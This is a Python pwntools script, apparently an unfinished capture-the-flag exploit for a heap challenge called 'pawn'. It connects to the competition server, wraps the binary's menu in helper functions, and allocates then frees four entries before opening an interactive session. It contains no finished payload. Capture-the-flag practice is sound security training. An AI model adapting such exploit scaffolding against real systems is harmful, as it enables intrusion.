#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['kitty', '-e', 'sh', '-c']

exe = context.binary = ELF('./pawn')


host = args.HOST or 'shell.actf.co'
port = int(args.PORT or 21706)

def local(argv=[], *a, **kw):
	'''Execute the target binary locally'''
	if args.GDB:
		return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
	else:
		return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
	'''Connect to the process on the remote host'''
	io = connect(host, port)
	if args.GDB:
		gdb.attach(io, gdbscript=gdbscript)
	return io

def start(argv=[], *a, **kw):
	'''Start the exploit against the target.'''
	if args.LOCAL:
		return local(argv, *a, **kw)
	else:
		return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def select_choice(option):
	io.recvuntil("5)")
	io.recvline()
	io.sendline(str(option))

def add(idx):
	select_choice(1)
	io.sendlineafter("?\n", str(idx))

def print(idx):
	select_choice(2)
	io.sendlineafter("?\n", str(idx))

def move(idx, x1, y1, x2, y2):
	select_choice(3)
	io.sendlineafter("?\n", str(idx))
	io.sendlineafter("Please provide the x and y values of the piece, separated by spaces.\n", f"{str(x1)} {str(y1)}")
	io.sendlineafter("Please provide the x and y values of the position to move to, separated by spaces.\n", f"{str(x2)} {str(y2)}")
	
def smite(idx, x1, y1):
	select_choice(4)
	io.sendlineafter("?\n", str(idx))
	io.sendlineafter("Please provide the x and y values of the piece, separated by spaces.\n", f"{str(x1)} {str(y1)}")

def delete(idx):
	select_choice(5)
	io.sendlineafter("?\n", str(idx))

io = start()
for i in range(4):
	add(i)
for i in range(4):
	delete(i)

io.interactive()

